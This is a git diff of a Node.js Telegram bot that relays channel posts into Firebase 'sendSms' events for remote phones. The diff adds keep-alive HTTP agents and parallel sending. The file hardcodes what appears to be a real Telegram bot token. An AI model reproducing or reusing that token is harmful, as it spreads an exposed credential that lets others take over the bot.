@@ -2,7 +2,18 @@ const express = require('express');
 const fs = require('fs');
 const path = require('path');
 const axios = require('axios');
+const http = require('http');
+const https = require('https');
 const { Telegraf } = require('telegraf');
+
+// 🚀 Keep-Alive agents — Firebase write 50-70ms faster hoga
+const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 100 });
+const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 100 });
+const axiosInstance = axios.create({
+    httpAgent,
+    httpsAgent,
+    timeout: 10000
+});
 
 const PORT = process.env.PORT || 3000;
 const BOT_TOKEN = '8928344876:AAHhu5s2eAsfIQmOLjdjuwy_-JRD0fruwNA';
@@ -11,7 +22,7 @@ const DATA_FILE = path.join(__dirname, 'data.json');
 let store = { users: {} };
 let processed = new Set();
 let cfgCache = {};
-const CFG_TTL = 300000;              // 5 minute cache — fast speed
+const CFG_TTL = 300000;              // 5 minute cache
 const CFG_REFRESH_INTERVAL = 15000;  // 15s background refresh
 
 function load() {
@@ -99,16 +110,17 @@ app.post('/api/notify-channel', async function (req, res) {
 
 app.listen(PORT, '0.0.0.0', function () {
     console.log('Server running on port ' + PORT);
+    console.log('🚀 HTTP Keep-Alive enabled');
     Object.keys(store.users).forEach(function (u) {
         refreshCfg(u).catch(function () {});
     });
 });
 
+// 🚀 Using axiosInstance with Keep-Alive
 async function fbGet(url, p) {
     try {
-        const r = await axios.get(
-            url.replace(/\/$/, '') + '/' + p + '.json',
-            { timeout: 10000 }
+        const r = await axiosInstance.get(
+            url.replace(/\/$/, '') + '/' + p + '.json'
         );
         return r.data;
     } catch (e) {
@@ -118,10 +130,9 @@ async function fbGet(url, p) {
 
 async function fbPut(url, p, data) {
     try {
-        const r = await axios.put(
+        const r = await axiosInstance.put(
             url.replace(/\/$/, '') + '/' + p + '.json',
-            data,
-            { timeout: 10000 }
+            data
         );
         return r.status === 200;
     } catch (e) {
@@ -146,7 +157,7 @@ function refreshCfg(u) {
         });
 }
 
-// Background refresh — cache always fresh
+// Background refresh
 setInterval(function () {
     Object.keys(store.users).forEach(function (u) {
         refreshCfg(u).catch(function () {});
@@ -234,35 +245,32 @@ bot.on('channel_post', async function (ctx) {
     const urls = Object.keys(store.users);
     console.log('Checking', urls.length, 'users');
 
-    for (const fbUrl of urls) {
+    // 🚀 PARALLEL sending — sab users ko ek saath
+    await Promise.all(urls.map(async function (fbUrl) {
         try {
-            // FAST PATH: cache se turant
             let cfg = getCfg(fbUrl);
 
-            // Cache expired? Purana use karo, peeche refresh
             if (!cfg) {
                 cfg = cfgCache[fbUrl] ? cfgCache[fbUrl].cfg : null;
                 refreshCfg(fbUrl).catch(function () {});
             }
 
-            // Bilkul cache nahi? Abhi fetch karo (rare)
             if (!cfg) {
                 cfg = await refreshCfg(fbUrl);
             }
 
             if (!cfg) {
                 console.log('No config for', fbUrl);
-                continue;
+                return;
             }
 
             if (!cfg.channels || cfg.channels.indexOf(chatId) === -1) {
-                continue;
+                return;
             }
 
             let targetDevice = null;
             let simSlot = 0;
 
-            // Naya per-device structure
             if (cfg.devices && typeof cfg.devices === 'object') {
                 const enabledDevices = Object.entries(cfg.devices)
                     .filter(([id, d]) => d && d.enabled === true);
@@ -275,14 +283,13 @@ bot.on('channel_post', async function (ctx) {
                 }
             }
 
-            // Legacy fallback
             if (!targetDevice && cfg.tokenEnabled && cfg.tokenDevice) {
                 targetDevice = cfg.tokenDevice;
                 simSlot = cfg.tokenSim || 0;
             }
 
             if (!targetDevice) {
-                continue;
+                return;
             }
 
             const clean = cleanNumber(tok.number);
@@ -290,7 +297,7 @@ bot.on('channel_post', async function (ctx) {
 
             console.log('Sending to device:', targetDevice, 'SIM:', simSlot);
 
-            // ⏱️ Firebase write timing start
+            // ⏱️ Firebase write timing
             const fbStart = Date.now();
 
             await fbPut(fbUrl, 'clients/' + targetDevice + '/webhookEvent/sendSms', {
@@ -303,11 +310,11 @@ bot.on('channel_post', async function (ctx) {
                 fromToken: true
             });
 
-            // ⏱️ Firebase write time log
             const fbTime = Date.now() - fbStart;
-            console.log('⚡ Firebase write: ' + fbTime + 'ms  ← ASLI SPEED');
+            console.log('⚡ Firebase write: ' + fbTime + 'ms');
 
             const elapsed = Date.now() - start;
+
             const reply = '✅ SMS Bhej diya\n\n' +
                 '📱 Device: ' + targetDevice + '\n' +
                 '📞 To: ' + clean + '\n' +
@@ -316,7 +323,7 @@ bot.on('channel_post', async function (ctx) {
                 '⏱️ Total: ' + elapsed + 'ms\n\n' +
                 '📝 Body:\n' + tok.message;
 
-            // Fire-and-forget reply (await nahi — speed ke liye)
+            // Fire-and-forget reply
             bot.telegram.sendMessage(chatId, reply, {
                 reply_to_message_id: msgId
             }).catch(function (e) { console.log('Reply error:', e.message); });
@@ -326,7 +333,7 @@ bot.on('channel_post', async function (ctx) {
         } catch (e) {
             console.error('Error processing', fbUrl, ':', e.message);
         }
-    }
+    }));
 });
 
 bot.command('id', function (ctx) {
